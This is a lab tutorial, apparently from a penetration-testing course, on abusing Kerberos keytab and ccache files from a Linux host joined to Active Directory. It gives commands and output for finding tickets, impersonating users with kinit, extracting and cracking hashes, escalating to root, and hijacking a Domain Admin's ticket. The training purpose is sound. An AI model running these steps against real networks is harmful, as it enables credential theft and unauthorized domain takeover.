A Linux computer connected to Active Directory commonly uses Kerberos as authentication. Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.

**Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

## Kerberos on Linux
Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by specific read/write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files. A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.

**Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

## Scenario
To practice and understand how we can abuse Kerberos from a Linux system, we have a computer (`LINUX01`) connected to the Domain Controller. This machine is only reachable through `MS01`. To access this machine over SSH, we can connect to `MS01` via RDP and, from there, connect to the Linux machine using SSH from the Windows command line. Another option is to use a port forward.

#### Linux auth from MS01
![[Pasted image 20251006174951.png]]

As an alternative, we created a port forward to simplify the interaction with `LINUX01`. By connecting to port TCP/2222 on `MS01`, we will gain access to port TCP/22 on `LINUX01`.
Let's assume we are in a new assessment, and the company gives us access to `LINUX01` and the user `david@inlanefreight.htb` and password `Password2`.

## Identifying Linux and Active Directory integration
We can identify if the Linux machine is domain-joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.
#### realm - Check if Linux machine is domain-joined
```shell
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

The output of the command indicates that the machine is configured as a Kerberos member. It also gives us information about the domain name (inlanefreight.htb) and which users and groups are permitted to log in, which in this case are the users David and Julio and the group Linux Admins.

In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). Looking for those services running in the machine is another way to identify if it is domain-joined. We can read this [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details. Let's search for those services to confirm if the machine is domain-joined.

#### PS - Check if Linux machine is domain-joined
```shell
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files

```


## Finding Kerberos tickets in Linux
As an attacker, we are always looking for credentials. On Linux domain-joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. Let's explore some common ways to find Kerberos tickets.

## Finding KeyTab files
A straightforward approach is to use `find` to search for files whose name contains the word `keytab`. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to `.keytab`. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.

```shell
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

...SNIP...

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

**Note:** To use a keytab file, we must have read and write (rw) privileges on the file.

#### Identifying KeyTab files in Cronjobs
```shell
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
...SNIP...
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```
In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use `kinit` to import a `keytab` into our session and act as the user.

In this example, we found a script importing a Kerberos ticket (`svc_workstations.kt`) for the user `svc_workstations@INLANEFREIGHT.HTB` before trying to connect to a shared folder. We'll later discuss how to use those tickets and impersonate users.

**Note:** As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

## Finding ccache files
A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the `KRB5CCNAME` environment variable.
#### Reviewing environment variables for ccache files.
```shell
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```
As mentioned previously, `ccache` files are located, by default, at `/tmp`. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.

#### Searching for ccache files in /tmp
```shell
david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

## Abusing KeyTab files
As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using `kinit`. To use a keytab file, we need to know which user it was created for. `klist` is another application used to interact with Kerberos on Linux. This application reads information from a `keytab` file. Let's see that with the following command:

#### Listing KeyTab file information
```shell-session
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- -----------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

The ticket corresponds to the user Carlos. We can now impersonate the user with `kinit`. Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.

**Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.
#### Impersonating a user with a KeyTab
```shell
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

We can attempt to access the shared folder `\\dc01\carlos` to confirm our access.
#### Connecting to SMB Share as Carlos
```shel;
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022
```

**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.

### KeyTab Extract
The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.

We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.

#### Extracting KeyTab hashes with KeyTabExtract
```shell
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

**Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.

#### Log in as Carlos

```shell
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
```
```shell
carlos@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13
```

### Obtaining more hashes
Carlos has a cronjob that uses a KeyTab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.

## Abusing KeyTab ccache
To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.

Once we log in with the credentials for the user `svc_workstations`, we can use `sudo -l` and confirm that the user can execute any command as root. We can use the `sudo su` command to change the user to root.

#### Privilege escalation to root
```shell
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root
```
As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.

#### Looking for ccache files

```shell-session
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..

```
There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. We can confirm the groups to which he belongs using `id`.

#### Identifying group membership with the id command
```shell-session
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

Julio is a member of the `Domain Admins` group. We can attempt to impersonate the user and gain access to the `DC01` Domain Controller host.

To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

#### Importing the ccache file into our current session
```shell
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .

```

**Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

## Using Linux attack tools with Kerberos
